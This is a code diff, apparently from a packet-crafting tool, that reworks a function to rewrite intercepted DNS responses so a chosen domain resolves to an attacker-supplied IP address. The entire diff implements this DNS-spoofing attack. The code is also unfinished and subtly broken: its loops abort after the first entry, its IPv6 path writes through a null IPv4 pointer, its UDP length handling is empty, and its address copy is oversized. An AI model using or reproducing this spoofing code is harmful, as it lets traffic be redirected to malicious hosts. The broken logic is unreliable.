@@ -102,28 +102,91 @@ bool32 FilterPacket(const PacketCraft::Packet& packet, void* data)
 uint32_t EditPacket(PacketCraft::Packet& packet, void* data)
 {
     PacketFuncData myData = *(PacketFuncData*)data;
-    DNSHeader* originalDNS = (DNSHeader*)packet.FindLayerByType(PC_DNS_RESPONSE);
+    EthHeader* ethHeader = (EthHeader*)packet.FindLayerByType(PC_ETHER_II);
+    IPv4Header* ipv4Header = (IPv4Header*)packet.FindLayerByType(PC_IPV4);
+    IPv6Header* ipv6Header = (IPv6Header*)packet.FindLayerByType(PC_IPV6); // TODO: support IPv6
+    UDPHeader* udpHeader = (UDPHeader*)packet.FindLayerByType(PC_UDP);
+    TCPHeader* tcpHeader = (TCPHeader*)packet.FindLayerByType(PC_TCP); // TODO: support dns over TCP
+    DNSHeader* dnsHeader = (DNSHeader*)packet.FindLayerByType(PC_DNS_RESPONSE);
     int layerIndex = packet.FindIndexByType(PC_DNS_RESPONSE);
-    uint32_t originalDNSSize = packet.GetLayerSize(layerIndex);
-
-    char qNameInDNSFormat[FQDN_MAX_STR_LEN]{};
-    if(PacketCraft::DomainToDNSName(myData.domain, qNameInDNSFormat) == APPLICATION_ERROR)
-    {
-        LOG_ERROR(APPLICATION_ERROR, "PacketCraft::DomainToDNSName() error");
-        return APPLICATION_ERROR;
-    }
 
     PacketCraft::DNSParser dnsParser;
-    if(dnsParser.Parse(*originalDNS) == APPLICATION_ERROR)
+    if(dnsParser.Parse(*dnsHeader) == APPLICATION_ERROR)
     {
         LOG_ERROR(APPLICATION_ERROR, "PacketCraft::DNSParser::Parse() error");
         return FALSE;
     }
 
-    // adding +1 because the last label length is 0. Apparantly it gets treated as a null terminating character, but we need it included
-    uint32_t qNameLen = PacketCraft::GetStrLen(qNameInDNSFormat) + 1;
-    uint32_t qType = 
+    // edit so that the dnsParser only has 1 question in it (which matches the domain name the user wants to spoof)
+    // if we set qcount to 1, only the first question in the array will be later Convert()ed to the new DNS response
+    for(unsigned int i = 0; i < dnsParser.header.qcount; ++i)
+    {
+        if(PacketCraft::CompareStr(myData.domain, dnsParser.questionsArray[i].qName) == TRUE)
+        {
+            memcpy(dnsParser.questionsArray[0].qName, dnsParser.questionsArray[i].qName, FQDN_MAX_STR_LEN);
+            dnsParser.questionsArray[0].qType = dnsParser.questionsArray[i].qType;
+            dnsParser.questionsArray[0].qClass = dnsParser.questionsArray[i].qClass;
+            dnsParser.header.qcount = 1;
+            break;
+        }
 
+        LOG_ERROR(APPLICATION_ERROR, "could not find the question containing the domain name");
+        return APPLICATION_ERROR;
+    }
+
+    // find the answer containing the A record and edit it to contain the IP address the user has provided
+    // if we set ancount to 1, only the first answer in the array will be later Convert()ed to the new DNS response
+    for(unsigned int i = 0; i < dnsParser.header.ancount; ++i)
+    {
+        // find the A record TODO: support IPV6 (AAAA records)
+        if(dnsParser.answersArray[i].aType == 1)
+        {
+            std::cout << "A record found" << std::endl;
+            memcpy(dnsParser.answersArray[0].aName, myData.domain, FQDN_MAX_STR_LEN);
+            dnsParser.answersArray[0].aType = dnsParser.answersArray[i].aType;
+            dnsParser.answersArray[0].aClass = dnsParser.answersArray[i].aClass;
+            dnsParser.answersArray[0].timeToLive = dnsParser.answersArray[i].timeToLive;
+            dnsParser.answersArray[0].rLength = 4; // length of an ipv4 address
+            memcpy(dnsParser.answersArray[0].rData, myData.fakeDomainIP, INET6_ADDRSTRLEN);
+            dnsParser.header.ancount = 1;
+            break;
+        }
+
+        LOG_ERROR(APPLICATION_ERROR, "could not find the A record answer");
+        return APPLICATION_ERROR;
+    }
+
+    // convert the data in dnsParser to a proper DNS response
+    uint32_t len{};
+    DNSHeader* newDNSResponse = dnsParser.Convert(len);
+
+    // delete the old dns layer from the packet
+    packet.DeleteLayer(layerIndex);
+
+    // add the new dns response to the packet
+    packet.AddLayer(PC_DNS_RESPONSE, len);
+    memcpy(packet.GetLayerStart(packet.GetNLayers() - 1), newDNSResponse, len);
+    free(newDNSResponse);
+
+    if(ipv4Header)
+    {
+        if(ethHeader)
+            ipv4Header->ip_len = htons(packet.GetSizeInBytes() - ETH_HLEN);
+        else
+            ipv4Header->ip_len = htons(packet.GetSizeInBytes());
+
+        if(udpHeader)
+        {
+            
+        }
+    }
+    else if(ipv6Header)
+    {
+        if(ethHeader)
+            ipv6Header->ip6_ctlun.ip6_un1.ip6_un1_plen = htons(packet.GetSizeInBytes() - ETH_HLEN);
+        else
+            ipv4Header->ip_len = htons(packet.GetSizeInBytes());
+    }
 
     return NO_ERROR;
 }
